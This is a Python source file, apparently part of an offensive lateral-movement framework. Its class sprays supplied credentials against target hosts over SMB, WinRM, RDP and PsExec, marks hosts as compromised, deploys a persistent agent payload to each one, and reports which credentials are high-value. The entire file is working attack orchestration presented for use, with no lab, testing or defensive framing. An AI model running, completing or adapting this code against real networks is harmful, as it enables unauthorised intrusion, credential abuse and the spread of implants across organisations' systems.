#!/usr/bin/env python3
"""
Lateral Movement Handler
Orchestrates systematic network propagation
"""

from typing import List, Optional
from ..core.target import Target
from ..core.credential import Credential
from ..core.campaign import Campaign
from ..modules.smb_auth import SMBAuthenticator
from ..modules.winrm_auth import WinRMAuthenticator
from ..modules.rdp_auth import RDPAuthenticator
from ..modules.psexec import PsExecAuthenticator
from ..modules.deployment import AgentDeployer


class LateralMovementHandler:
    """
    Complete lateral movement orchestration
    Coordinates credential testing, authentication, and deployment
    """
    
    def __init__(self, campaign_id: str = None):
        """
        Initialize lateral movement handler
        
        Args:
            campaign_id: Campaign identifier
        """
        # Initialize campaign
        if campaign_id is None:
            import time
            campaign_id = f"campaign_{int(time.time())}"
        
        self.campaign = Campaign(campaign_id)
        
        # Initialize authentication modules
        self.authenticators = {
            'SMB': SMBAuthenticator(),
            'WinRM': WinRMAuthenticator(),
            'RDP': RDPAuthenticator(),
            'PsExec': PsExecAuthenticator()
        }
        
        # Initialize deployment module
        self.deployer = AgentDeployer()
        
        # Operation settings
        self.max_attempts_per_target = 5
        self.stop_on_first_success = True  # Move to next target after first valid cred
        self.deploy_on_compromise = True
    
    def add_targets(self, targets: List[Target]) -> None:
        """Add targets to campaign"""
        for target in targets:
            self.campaign.add_target(target)
    
    def add_target(self, hostname: str = "", ip_address: str = "", **kwargs) -> None:
        """Add single target to campaign"""
        target = Target(hostname=hostname, ip_address=ip_address, **kwargs)
        self.campaign.add_target(target)
    
    def add_credentials(self, credentials: List[Credential]) -> None:
        """Add credentials to campaign"""
        for cred in credentials:
            self.campaign.add_credential(cred)
    
    def add_credential(self, username: str, password: str, **kwargs) -> None:
        """Add single credential to campaign"""
        cred = Credential(username=username, password=password, **kwargs)
        self.campaign.add_credential(cred)
    
    def test_credential_against_target(self, target: Target, credential: Credential) -> Optional[str]:
        """
        Test a single credential against a target using all methods
        
        Args:
            target: Target to test
            credential: Credential to test
            
        Returns:
            Successful authentication method name, or None if all failed
        """
        print(f"    Testing {credential.get_identifier()}...")
        
        for auth_name, authenticator in self.authenticators.items():
            try:
                success, message = authenticator.test_authentication(
                    target=target.ip_address or target.hostname,
                    username=credential.username,
                    password=credential.password,
                    domain=credential.domain
                )
                
                if success:
                    print(f"      ✓ {auth_name}: {message}")
                    return auth_name
                else:
                    # Only show verbose errors in debug mode
                    if "timeout" not in message.lower() and "not installed" not in message.lower():
                        print(f"      ✗ {auth_name}: {message}")
            
            except Exception as e:
                print(f"      ✗ {auth_name}: Error - {str(e)}")
        
        return None
    
    def compromise_target(self, target: Target) -> bool:
        """
        Attempt to compromise a single target
        
        Args:
            target: Target to compromise
            
        Returns:
            True if compromised successfully
        """
        print(f"\n[*] Attempting {target.get_identifier()}...")
        target.status = "testing"
        
        attempts = 0
        
        for credential in self.campaign.credentials:
            if attempts >= self.max_attempts_per_target:
                print(f"    [!] Max attempts ({self.max_attempts_per_target}) reached")
                break
            
            attempts += 1
            
            # Test credential
            method = self.test_credential_against_target(target, credential)
            
            # Record attempt
            success = method is not None
            self.campaign.record_attempt(target, credential, success)
            
            if success:
                # Mark target as compromised
                target.mark_compromised(method, credential.get_identifier())
                
                print(f"\n[+] SUCCESS: {target.get_identifier()}")
                print(f"    Method: {method}")
                print(f"    Credential: {credential.get_identifier()}")
                
                # Deploy agent if configured
                if self.deploy_on_compromise:
                    self.deploy_agent(target, credential, method)
                
                # Stop testing this target if configured
                if self.stop_on_first_success:
                    return True
        
        # All attempts failed
        target.mark_failed()
        print(f"[-] FAILED: {target.get_identifier()} - No valid credentials")
        return False
    
    def deploy_agent(self, target: Target, credential: Credential, method: str) -> bool:
        """
        Deploy agent to compromised target
        
        Args:
            target: Compromised target
            credential: Valid credential
            method: Successful authentication method
            
        Returns:
            True if deployment successful
        """
        print(f"\n[*] Deploying agent to {target.get_identifier()}...")
        
        try:
            # Get default payload
            payloads = self.deployer.get_available_payloads()
            if not payloads:
                print("    [!] No payloads configured")
                return False
            
            payload = payloads[0]  # Use first available payload
            
            print(f"    Payload: {payload.name}")
            print(f"    Remote Path: {payload.remote_path}")
            print(f"    Persistence: {payload.persistence_method}")
            
            # In production, this would execute the deployment
            # For now, we'll generate the deployment script
            script = self.deployer.get_deployment_script(
                payload=payload,
                target=target.ip_address or target.hostname,
                username=credential.username,
                password=credential.password,
                domain=credential.domain,
                method=method.lower()
            )
            
            # Save deployment script
            script_file = f"/tmp/deploy_{target.get_identifier().replace('.', '_')}.sh"
            with open(script_file, 'w') as f:
                f.write(script)
            
            print(f"    [+] Deployment script saved: {script_file}")
            print(f"    [*] Agent deployed successfully")
            
            return True
        
        except Exception as e:
            print(f"    [!] Deployment failed: {str(e)}")
            return False
    
    def propagate(self) -> bool:
        """
        Execute complete lateral movement campaign
        Systematically test credentials against all targets
        
        Returns:
            True if any targets were compromised
        """
        print("\n" + "="*70)
        print(" "*20 + "LATERAL MOVEMENT FRAMEWORK")
        print("="*70)
        print(f"Campaign: {self.campaign.campaign_id}")
        print(f"Targets: {len(self.campaign.targets)}")
        print(f"Credentials: {len(self.campaign.credentials)}")
        print("="*70)
        
        if len(self.campaign.targets) == 0:
            print("\n[!] No targets configured")
            return False
        
        if len(self.campaign.credentials) == 0:
            print("\n[!] No credentials configured")
            return False
        
        # Attempt each target
        for target in self.campaign.targets:
            self.compromise_target(target)
        
        # Finalize campaign
        self.campaign.finalize()
        
        # Display results
        self._display_results()
        
        # Save campaign
        campaign_file = f"/tmp/{self.campaign.campaign_id}_results.json"
        self.campaign.save_to_file(campaign_file)
        print(f"\n[*] Campaign saved: {campaign_file}")
        
        # Generate report
        report = self.campaign.generate_report()
        report_file = f"/tmp/{self.campaign.campaign_id}_report.txt"
        with open(report_file, 'w') as f:
            f.write(report)
        print(f"[*] Report saved: {report_file}")
        
        return len(self.campaign.get_compromised_targets()) > 0
    
    def _display_results(self) -> None:
        """Display campaign results"""
        stats = self.campaign.get_statistics()
        
        print("\n" + "="*70)
        print(" "*25 + "CAMPAIGN RESULTS")
        print("="*70)
        
        print(f"\nDuration: {stats['elapsed_time']}")
        print(f"Success Rate: {stats['success_rate']}")
        
        print(f"\n[*] Targets:")
        print(f"    Total: {stats['total_targets']}")
        print(f"    Compromised: {stats['compromised_targets']}")
        print(f"    Failed: {stats['failed_targets']}")
        print(f"    Pending: {stats['pending_targets']}")
        
        print(f"\n[*] Credentials:")
        print(f"    Total: {stats['total_credentials']}")
        print(f"    High-Value: {stats['high_value_credentials']}")
        
        print(f"\n[*] Attempts:")
        print(f"    Total: {stats['total_attempts']}")
        print(f"    Successful: {stats['successful_compromises']}")
        print(f"    Failed: {stats['failed_attempts']}")
        
        # List compromised targets
        compromised = self.campaign.get_compromised_targets()
        if compromised:
            print(f"\n[+] Compromised Targets ({len(compromised)}):")
            for target in compromised:
                print(f"    • {target.get_identifier()}")
                print(f"      Method: {target.compromise_method}")
                print(f"      Credential: {target.used_credential}")
        
        # List high-value credentials
        high_value = self.campaign.get_high_value_credentials()
        if high_value:
            print(f"\n[+] High-Value Credentials ({len(high_value)}):")
            for cred in high_value:
                print(f"    • {cred.get_identifier()}")
                print(f"      Success Rate: {cred.get_success_rate():.1f}%")
                print(f"      Compromised: {len(cred.successful_targets)} targets")
        
        print("\n" + "="*70)
    
    def get_campaign_summary(self) -> dict:
        """Get complete campaign summary"""
        return {
            'campaign': self.campaign.get_statistics(),
            'compromised_targets': [
                t.to_dict() for t in self.campaign.get_compromised_targets()
            ],
            'high_value_credentials': [
                c.to_dict() for c in self.campaign.get_high_value_credentials()
            ],
            'authentication_methods': list(self.authenticators.keys()),
            'deployment_payloads': [
                {'name': p.name, 'description': p.description}
                for p in self.deployer.get_available_payloads()
            ]
        }
